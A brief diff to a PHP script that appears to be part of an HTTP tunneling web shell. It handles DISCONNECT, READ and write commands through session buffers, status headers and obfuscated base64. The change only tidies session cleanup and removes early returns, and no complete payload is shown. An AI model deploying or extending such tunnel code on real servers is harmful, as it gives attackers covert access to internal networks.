@@ -109,9 +109,10 @@ switch($cmd){
     case "DISCONNECT":
         {
             @session_start();
-            $_SESSION[$run] = false;
+            unset($_SESSION[$run]);
+            unset($_SESSION[$readbuf]);
+            unset($_SESSION[$writebuf]);
             session_write_close();
-            return;
         }
         break;
     case "READ":
@@ -125,10 +126,8 @@ switch($cmd){
                 header('X-STATUS: OK');
                 header("Connection: Keep-Alive");
                 echo strtr(base64_encode($readBuffer), $en, $de);
-                return;
             } else {
                 header('X-STATUS: FAIL');
-                return;
             }
         }
         break;
@@ -149,7 +148,6 @@ switch($cmd){
                 session_write_close();
                 header('X-STATUS: OK');
                 header("Connection: Keep-Alive");
-                return;
             } else {
                 header('X-STATUS: FAIL');
                 header('X-ERROR: POST request read filed');
